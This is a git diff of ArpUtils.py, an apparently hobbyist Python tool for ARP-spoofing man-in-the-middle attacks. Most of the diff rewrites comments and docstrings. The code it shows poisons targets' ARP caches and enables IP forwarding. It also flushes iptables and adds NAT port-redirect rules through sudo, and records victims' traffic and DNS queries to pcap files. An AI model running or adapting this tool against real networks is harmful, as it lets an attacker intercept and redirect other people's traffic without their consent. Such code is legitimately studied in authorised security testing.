@@ -30,9 +30,8 @@ RouterInfo = {}
 class ArpUtils(object):
 
     """
-    Main class for ArpUtils.py. This houses all of the code necessary
-    to parse user input, launch attacks, and perform any other functions
-    necessary to facilitate sucessful ARP based attacks.
+    Main class, houses code for parsing user input and calling
+    Objects 
     """
 
     def __init__(self):
@@ -174,7 +173,7 @@ class ArpUtils(object):
         ]
 
         # The command_list dictionary stores information about commands
-        # that the user enters, and also the object that should be called
+        # that the user enters, and the corresponsing object to be called
         # when that command is issued. It also contains a brief description
         # of the command, and the Index, which is used to specify the order
         # of printing when the 'help' command is used.
@@ -261,12 +260,8 @@ class ArpUtils(object):
     class ArpSpoof(object):
 
         """
-        This class is responsible for facilitating the 'ARP Spoof' attack.
-        This attack will utilise ARP Spoofing to make target computers
-        alter their ARP table, mapping the attacker's MAC to the routers's
-        internal IP Address, causing all traffic bound to the router, to
-        be sent to this computer instead. The traffic will be recorded and
-        forwarded to the router in order to stay undetected.
+        This class houses the code responsible for the ARP Spoofing
+        Part of the framework.
         """
 
         def __init__(self, attack, interface, gateway):
@@ -326,7 +321,10 @@ class ArpUtils(object):
             desthosts = self.attack['Options']['redirect']['Options']['desthosts']['Value']
             interface = self.attack['Options']['iface']['Value']
 
+            # If redirect setting has been set
             if self.attack['Options']['redirect']['Value'] is True:
+
+                # Verify options are present and in correct format
                 if (len(targetports) == 0) or (len(destports) == 0):
                     raise Exception('Both targetports and destports must have at least one port.')
 
@@ -344,10 +342,12 @@ class ArpUtils(object):
 
                     print(desthosts)
 
+                # Flush iptables and enable packet forwarding
                 system(
                     'sudo /sbin/iptables --flush && sudo /sbin/iptables -t nat --flush && sudo /sbin/iptables --zero && sudo /sbin/iptables -A FORWARD --in-interface %s -j ACCEPT && sudo /sbin/iptables -t nat --append POSTROUTING --out-interface %s -j MASQUERADE' % (
                         interface, interface))
 
+                # Add rule for each target port
                 for port in targetports:
                     if type(desthosts) is list:
                         system(
@@ -362,23 +362,21 @@ class ArpUtils(object):
                             % (interface, int(port), desthosts, int(destports[targetports.index(port)]))
                         )
 
+            # Start attack
             self.run()
 
         class SniffPackets(threading.Thread):
 
             """
-            This class is responsible for capturing and recording any packets
-            that that reach the computer. It will also parse DNS queries using
-            the filter_packets function, which will filter DNS queries out
-            from the real-time data, and display them, provided that the correct
-            options are set.
+            Sniffs packets on specified interface, logging
+            Them to a pcap file. Also responsible for DNS
+            Related options.
             """
 
             def __init__(self, attack):
                 threading.Thread.__init__(self)
 
-                # If OS is unix based, enable IPv4 packet forwarding.
-
+                # Enable IPv4 packet forwarding.
                 with open('/proc/sys/net/ipv4/ip_forward', 'w') as handle:
                     handle.write('1')
                     handle.flush()
@@ -387,13 +385,10 @@ class ArpUtils(object):
                 self.attack = attack
                 self.handle = None
 
-            # This function of the SniffPackets class is responsible for
-            # checking packets passed to if from the Sniff() function
-            # in the calling function, and then checking it to see if
-            # it contains headers that are of use to us. This function
-            # relies on options set by the user in the attack struct.
-            # Such as 'PrintDNS'.
-
+            # This function uses the DNSUtils options
+            # Set by the user to parse packets and
+            # Decide if there are any alternative
+            # Requirements, such as printing DNS headers
             def filter_packets(self, pkt):
 
                 options = self.attack['Options']['dnsutils']['Options']
@@ -457,11 +452,9 @@ class ArpUtils(object):
 
                 handle.close()
 
-            # This function of the SniffPackets class is responsible for
-            # creating a filter to be used by the Sniff() function of the
-            # calling function, in order to filter packets specifically to
-            # target data.
-
+            # This function creates a filter which is used to
+            # ensure that only packets from the targets are
+            # sniffed by Scapy's sniff() function.
             @staticmethod
             def create_filter(gateway, targets):
                 # Initialise filter_string
@@ -488,8 +481,7 @@ class ArpUtils(object):
 
             def run(self):
 
-                # Add in checks to make sure that all required options have been set.
-
+                # Make sure required options have been set
                 if self.attack['Options']['gateway']['Value'] == '':
                     raise Exception('Gateway value must be set.')
                 elif self.attack['Options']['iface']['Value'] == '':
@@ -499,9 +491,11 @@ class ArpUtils(object):
                 elif self.attack['Vars']['live_hosts'] is []:
                     raise Exception('Must perform a scan before starting attack.')
 
+                # Create directory to store captured data
                 path = os.path.abspath('%s/%s' % (self.attack['Options']['path']['Value'],
                                                   self.attack['Options']['pcap']['Value']))
 
+                # Create PcapWriter opbect to write packets to a file
                 self.handle = PcapWriter(filename=path, append=True)
                 pkt_filter = self.create_filter(self.attack['Options']['gateway']['Value'],
                                                 self.attack['Options']['targets']['Value'])
@@ -520,13 +514,10 @@ class ArpUtils(object):
                     self.handle.flush()
 
                 self.handle.close()
-                return
 
-        # Main function of the ArpSpoof class. This function
-        # is responsible for spawning the SniffPackets thread,
-        # and also for sending the crafted ARP packets to
-        # selected targets.
-
+        # Cleans up after the attack. This will send out
+        # crafterd ARP packets to correct the ARP cache
+        # of each target, providing seamless transition.
         def cleanup(self, target_list):
 
             # Send an ARP packet to each target, correcting their ARP cache
@@ -536,10 +527,14 @@ class ArpUtils(object):
                         mal_packet_h = Ether(src=RouterInfo['MAC'])/ARP(psrc=self.attack['Options']['gateway']['Value'], pdst=target)
                         mal_packet_g = Ether(src=host['MAC'])/ARP(psrc=target, pdst=self.attack['Options']['gateway']['Value'])
 
+        # Main function of the ArpSpoof class. This function
+        # is responsible for spawning the SniffPackets thread,
+        # and also for sending the crafted ARP packets to
+        # selected targets.
         def run(self):
-            sniffer_thread = self.SniffPackets(self.attack)  # Initialise SniffPackets thread.
-            sniffer_thread.setDaemon(True)                   # Make sure thread is killed upon exit.
-            sniffer_thread.start()                           # Start SniffPackets thread.
+            sniffer_thread = self.SniffPackets(self.attack)  # Initialise and start
+            sniffer_thread.setDaemon(True)                   # SniffPackets thread
+            sniffer_thread.start()
 
             # Send a crafted ARP packet every 5 seconds. This should be sufficient
             # to keep targets sending data through the attacking computer.
@@ -611,11 +606,6 @@ class ArpUtils(object):
             if command[0].find('.') != -1:
                 temp = command[0].split('.')
                 temp = map(lower, temp)
-
-                #temp_attack = self.attack
-                #temp_attack = temp_attack
-
-                #temp_attack['Options'] = {'DNSUtils': self.attack['Options']['DNSUtils']}
 
                 option = self.recursive_set(temp, self.attack)
 
@@ -876,6 +866,7 @@ class ArpUtils(object):
 
         self.attack['Object'].__call__(attack, interface, gateway)
 
+    # Exit the program
     @staticmethod
     def __command_quit(*param):
         del param
@@ -898,14 +889,7 @@ class ArpUtils(object):
 
     # This function of the ArpUtils class is responsible for turning
     # any CIDR formatted user input ([0-255].[0-255].[0-255].[0-255]/[24-32])
-    # in to a list of addresses which represents the CIDR range in which
-    # the user wants to target. E.g. if you were to pass the string
-    # '192.168.0.0/24' to this function, it would return a list of
-    # IP addresses with the last octet ranging from 2 - 254.
-    # The integers 0, 1, and 255 are ommitted, as they are special
-    # network addresses, and are not used by the DHCP under normal
-    # circumstances.
-
+    # in to a list of addresses.
     @staticmethod
     def cidr_list(cidr_str):
         ip, net_bits = cidr_str.split('/')
@@ -936,12 +920,8 @@ class ArpUtils(object):
 
         return hosts
 
-    # This function of the ARP Utils class is responsible for recursively
-    # printing data pertaining to the options available for the user to
-    # modify. It loops through each option in 'optlist', looking for more
-    # nested 'Options' keys. If ones is found, it recursively calls itself
-    # with a indentation level of tabbing + 1.
-
+    # Print options from the attack struct in a
+    # neat manner.
     def new_option_print(self, options):
         print('\nVariables:\n'
               '  Gateway: %s\n'
@@ -971,12 +951,11 @@ class ArpUtils(object):
         print('\nOptions:\n')
         self.recursive_print(options, 1)
 
+    # Recurse through the attack struct and display options
     def recursive_print(self, optlist1, tabbing):
         optlist = optlist1
 
         if 'dnsutils' and 'redirect' in optlist:
-
-            #del optlist['redirect']['Options']
             optlist = {'dnsutils': optlist['dnsutils'], 'redirect': optlist['redirect']}
 
         i = 0
@@ -998,8 +977,6 @@ class ArpUtils(object):
 
             if 'Options' in option:
                 append = '%s%s|%s' % ('  ' * tabbing, BLUE, END)
-            #elif tabbing > 1:
-            #    append = '%s|' % ('  ' * (tabbing - 1))
             else:
                 append = ''
 
@@ -1121,8 +1098,10 @@ class ArpUtils(object):
     def run(self):
         print(_banner_)
 
+        # Check system is running a unicx based OS
         if os.name == 'posix':
             try:
+                # Attempt to automatically retrieve default gateway and interface
                 self.iface, self.gateway = self.get_gateway_and_iface()
             except:
                 raise Exception('Could not find default gateway. Do you have network access?')
@@ -1132,6 +1111,7 @@ class ArpUtils(object):
         except socket.error:
             print('Error retrieving interface and gateway automatically, please set them manually.')
 
+        # Create ^C handler
         signal.signal(signal.SIGINT, handler)
 
         while True:
@@ -1154,6 +1134,7 @@ class ArpUtils(object):
                 if uinput != []:
                     uinput = map(lower, uinput)
 
+                    # If command is in command_list then call associated object
                     if uinput[0] in self.command_list:
                         if uinput[0] == 'perform':
                             self.command_list[uinput[0]]['Object'].__call__(self.attack, self.iface, self.gateway)
@@ -1164,6 +1145,7 @@ class ArpUtils(object):
                 print(ex.message)
 
 
+# Get private IP of interface
 def get_ip(interface):
     output = list(subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE).communicate())[0]
 
@@ -1172,21 +1154,26 @@ def get_ip(interface):
     return ip[0]
 
 
+# Return a lower case version of string s
 def lower(s):
     return s.lower()
 
 
+# Handle ^C signal
 def handler(*s):
     ExitQueue.put('EXIT')
 
 
 if __name__ == '__main__':
+    # Check if system is running a unix based OS
     if os.name != 'posix':
         print('This program can ony run in unix environments.')
         exit(-1)
 
+    # Check if program has root priviliges (required)
     if os.geteuid() != 0:
         print('Please run ArpUtils as root!')
         exit(-1)
 
+    # Call main class
     ArpUtils()
